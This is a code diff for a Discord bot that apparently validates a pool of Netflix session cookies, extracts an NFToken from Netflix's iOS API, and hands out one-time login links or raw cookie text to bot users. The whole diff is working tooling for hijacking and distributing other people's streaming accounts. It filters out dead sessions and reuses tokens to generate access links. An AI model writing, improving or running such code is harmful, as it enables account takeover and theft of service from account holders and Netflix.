@@ -449,6 +449,14 @@ def check_nf_cookie(cookie_text: str) -> dict:
             return {"ok": False, "reason": "Cookie expired (redirected to login)."}
 
     if _is_subscribed(info):
+        # ── Final gate: NFToken must be extractable ───────────────────────────
+        # A cookie is only considered truly valid if we can obtain an NFToken
+        # from the Netflix iOS API — because the bot needs the token to generate
+        # login links.  Cookies that pass the membership check but have a dead
+        # session on the mobile API are silently filtered out here.
+        nft, nft_err = create_nftoken(cookie_text, attempts=2)
+        if not nft:
+            return {"ok": False, "reason": f"NFToken failed: {nft_err}"}
         return {
             "ok":        True,
             "plan":      info.get("plan") or "Unknown",
@@ -456,6 +464,8 @@ def check_nf_cookie(cookie_text: str) -> dict:
             "country":   info.get("country") or "Unknown",
             "maxStreams": info.get("maxStreams"),
             "status":    info.get("membershipStatus"),
+            # Pre-fetched token — reused by _generate to avoid a second API call
+            "nft":       nft,
         }
 
     # Valid cookie but no active subscription
@@ -689,14 +699,14 @@ class GeneratorCog(commands.Cog):
                 )
                 return
 
-            # ── 2. Validate ───────────────────────────────────────────
+            # ── 2. Validate + NFToken (combined — check_nf_cookie now gates on NFToken) ──
             check = await loop.run_in_executor(None, check_nf_cookie, cookie)
             if not check["ok"]:
                 print(f"[Gen] Dead {tier} cookie (attempt {attempt+1}): {check.get('reason')}")
                 continue
 
-            # ── 3. Extract NFToken ────────────────────────────────────
-            nft, err = await loop.run_in_executor(None, create_nftoken, cookie, 3)
+            # ── 3. Reuse pre-fetched NFToken from the check result ────────────
+            nft = check.get("nft")
 
             # ── 4. Build response ─────────────────────────────────────
             embed = discord.Embed(
@@ -722,10 +732,9 @@ class GeneratorCog(commands.Cog):
                 embed.set_footer(text="Links are one-time use — open immediately.")
                 content = "\n".join(f"**{lbl}:** <{url}>" for lbl, url in links)
             else:
-                print(f"[Gen] NFToken failed ({tier}): {err}")
                 embed.add_field(
                     name="⚠️ NFToken Unavailable",
-                    value=f"Direct link unavailable ({err}). Import the raw cookie manually.",
+                    value="Direct link unavailable. Import the raw cookie manually.",
                     inline=False,
                 )
                 content = f"```\n{cookie[:1800]}\n```"
